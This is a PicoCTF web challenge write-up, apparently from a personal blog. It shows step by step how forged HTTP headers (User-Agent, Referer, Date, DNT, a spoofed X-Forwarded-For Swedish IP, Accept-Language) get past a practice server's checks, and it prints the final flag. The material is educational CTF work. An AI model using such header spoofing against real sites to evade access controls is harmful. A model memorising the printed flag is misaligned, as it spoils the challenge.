---
title: "Who are you?"
description: "Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn http://mercury.picoctf.net:52362/"
date: 2025-08-26
category: "web"
author: "sealldev"
section: "PicoCTF"
tags: ["medium"]
# image: "/images/picoctf/websockfish/icon.png"
---

I start the webserver and I am prompted with an error: `Only people who use the official PicoBrowser are allowed on this site!`

My original request is:
```http
GET / HTTP/1.1
Host: mercury.picoctf.net:52362
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

I need to change the User-Agent:
```http
GET / HTTP/1.1
Host: mercury.picoctf.net:52362
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: picobrowser
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

We now get a new error: `I don't trust users visiting from another site.`. We need to set the Referer header to the same page:
```http
GET / HTTP/1.1
Host: mercury.picoctf.net:52362
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: picobrowser
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://mercury.picoctf.net:52362
```

Next error: `Sorry, this site only worked in 2018.`. We need to use the Date header!
```http
GET / HTTP/1.1
Host: mercury.picoctf.net:52362
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: picobrowser
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://mercury.picoctf.net:52362
Date: 2018
```

`I don't trust users who can be tracked.`, the Do Not Track header!
```http
GET / HTTP/1.1
Host: mercury.picoctf.net:52362
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: picobrowser
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://mercury.picoctf.net:52362
Date: 2018
DNT: 1
```

`This website is only for people from Sweden.`, I get a Swedish IP address from [here](https://lite.ip2location.com/sweden-ip-address-ranges?lang=en_US) and use X-Forwarded-For to set our IP address:
```http
GET / HTTP/1.1
Host: mercury.picoctf.net:52362
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: picobrowser
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://mercury.picoctf.net:52362
Date: 2018
DNT: 1
X-Forwarded-For: 102.177.146.0
```

`You're in Sweden but you don't speak Swedish?`, We need to change the Accept-Language header to 'sv':
```http
GET / HTTP/1.1
Host: mercury.picoctf.net:52362
Accept-Language: sv
Upgrade-Insecure-Requests: 1
User-Agent: picobrowser
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://mercury.picoctf.net:52362
Date: 2018
DNT: 1
X-Forwarded-For: 102.177.146.0
```

GG!

Flag: `picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_0c0db339}`